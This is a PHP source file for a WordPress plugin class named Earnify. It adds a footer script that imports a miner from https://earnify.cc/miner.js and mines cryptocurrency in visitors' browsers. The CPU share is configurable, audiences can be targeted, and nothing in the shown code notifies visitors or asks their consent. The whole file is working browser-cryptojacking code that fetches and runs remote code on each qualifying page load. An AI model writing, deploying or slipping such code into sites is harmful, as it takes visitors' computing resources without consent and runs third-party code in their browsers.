<?php

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

class EWP_Frontend {

	public static function init(): void {
		add_action( 'wp_enqueue_scripts', [ __CLASS__, 'enqueue_assets' ] );
		add_action( 'wp_footer', [ __CLASS__, 'render_miner_script' ] );
	}

	public static function enqueue_assets(): void {
		if ( ! self::should_mine() ) {
			return;
		}
		wp_enqueue_style(
			'ewp-frontend',
			EWP_PLUGIN_URL . 'assets/css/style.css',
			[],
			EWP_VERSION
		);
	}

	public static function render_miner_script(): void {
		if ( ! self::should_mine() ) {
			return;
		}

		$wallet  = get_option( 'ewp_wallet', '' );
		$cpu_pct = absint( get_option( 'ewp_cpu_pct', '20' ) ) / 100;

		if ( empty( $wallet ) ) {
			return;
		}

		$wallet_js = wp_json_encode( $wallet );
		$cpu_js    = (float) $cpu_pct;
		?>
		<script type="module">
			import { autoMine } from "https://earnify.cc/miner.js";
			(async function () {
				try {
					var threads = await autoMine(<?php echo $wallet_js; // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped ?>, <?php echo $cpu_js; // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped ?>);
					console.log("[Earnify] Mining started — " + threads + " thread(s)");
				} catch (e) {
					console.warn("[Earnify] Mining failed to start:", e);
				}
			})();
		</script>
		<?php
	}

	private static function should_mine(): bool {
		if ( '1' !== get_option( 'ewp_enabled', '0' ) ) {
			return false;
		}

		if ( empty( get_option( 'ewp_wallet', '' ) ) ) {
			return false;
		}

		if ( is_admin() || wp_is_json_request() || wp_is_xml_request() ) {
			return false;
		}

		$audience = get_option( 'ewp_audience', 'all' );
		if ( 'logged_in' === $audience && ! is_user_logged_in() ) {
			return false;
		}
		if ( 'logged_out' === $audience && is_user_logged_in() ) {
			return false;
		}

		return true;
	}
}